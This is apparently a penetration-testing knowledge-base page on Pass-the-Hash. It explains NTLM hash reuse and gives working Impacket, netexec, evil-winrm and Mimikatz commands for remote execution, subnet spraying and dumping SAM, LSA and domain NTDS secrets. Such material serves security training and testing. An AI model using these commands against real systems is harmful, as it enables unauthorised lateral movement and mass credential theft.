# Pass-the-Hash (PtH) - NTLM Hash Reuse

> _Authenticate to remote services with a user's **NT hash** instead of their cleartext password - no cracking required.  
> PtH abuses **NTLM authentication**, so it works wherever NTLM is accepted (SMB, WMI, WinRM, RDP) and is independent of Kerberos._

## 📚 Resources

- [TheHackerRecipes - Pass the hash](https://www.thehacker.recipes/ad/movement/ntlm/pth)
- [hacktricks - NTLM / Pass the hash](https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html)

## 📌 Key Concepts

| Term                  | Description                                                                         |
| --------------------- | ----------------------------------------------------------------------------------- |
| **NT hash**           | MD4 of the user's UTF-16 password - the static secret NTLM proves knowledge of.     |
| **NTLM auth**         | Challenge/response using the NT hash. Holding the hash is as good as the password.  |
| **PtH**               | Reuse a stolen NT hash to authenticate, without ever recovering the password.       |
| **OverPass-the-Hash** | Trade the NT hash for a Kerberos TGT (RC4) - see [Pass-the-Ticket](./pass-the-ticket.md). |

> [!warning] NT hash, not NTLMv2
> PtH uses the **NT hash** (the secret stored in SAM/NTDS/LSASS). An **NTLMv2
> response** captured on the wire (e.g. with Responder) is a salted
> challenge-response and **cannot** be passed - it must be cracked or relayed.

Where to get the hash: [credential dumping](/active-directory/credential-dumping/) (LSASS, SAM, NTDS).

## Linux - Impacket & netexec

> _Impacket takes `-hashes LMHASH:NTHASH`; the LM half is almost always empty, so use `:$NT_HASH`. netexec takes `-H`._

::: code-group

```bash [exec]
# Remote command execution - footprint trade-offs covered in post-exploit
impacket-wmiexec -hashes :$NT_HASH $DOMAIN/$USER@$TARGET      # WMI, low footprint - good default
impacket-psexec  -hashes :$NT_HASH $DOMAIN/$USER@$TARGET      # SYSTEM shell, very noisy (service + binary)
evil-winrm -i $TARGET -u $USER -H $NT_HASH                    # WinRM (needs Remote Management Users)
```

```bash [netexec]
# Spray across a subnet first - (Pwn3d!) flags where the account is local admin
nxc smb $SUBNET -u $USER -H $NT_HASH
nxc smb $TARGET -u $USER -H $NT_HASH -x "whoami"              # exec on one host
nxc winrm $TARGET -u $USER -H $NT_HASH
```

```bash [files / secrets]
impacket-smbclient   -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
impacket-secretsdump -hashes :$NT_HASH $DOMAIN/$USER@$TARGET   # dump SAM/LSA on that host
```

```bash [dump NTDS]
# With a Domain Admin NT hash - pull the whole directory from the DC
impacket-secretsdump -hashes :$NT_HASH $DOMAIN/$USER@$DC_HOST
```

:::

## Windows - Mimikatz

```powershell
# Spawns a process whose network auth uses the NT hash (logon type 9) - no password needed
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NT_HASH /run:cmd.exe
# From the new window, use SMB/WMI tooling normally
```

`sekurlsa::pth` needs local admin and touches LSASS (heavily signatured) - prefer Impacket/nxc from Linux when you only need remote access.

## Limitations

- **NTLM must be allowed** on the target. In Kerberos-only / "NTLM disabled" environments, PtH fails - convert the hash to a TGT instead ([OverPass-the-Hash](./pass-the-ticket.md)).
- Only the built-in **Administrator (RID 500)** can PtH through remote UAC filtering; other **local** admins are blocked unless `LocalAccountTokenFilterPolicy = 1`. Domain accounts are unaffected.
- **AES-only** accounts are not reachable with an NT hash alone - you need the AES key or the password.

> [!tip] From NT hash to Kerberos
> If NTLM is blocked but Kerberos is up, request a TGT with the RC4 key (the NT
> hash) - see the **OverPass-the-Hash** section of [Pass-the-Ticket](./pass-the-ticket.md).
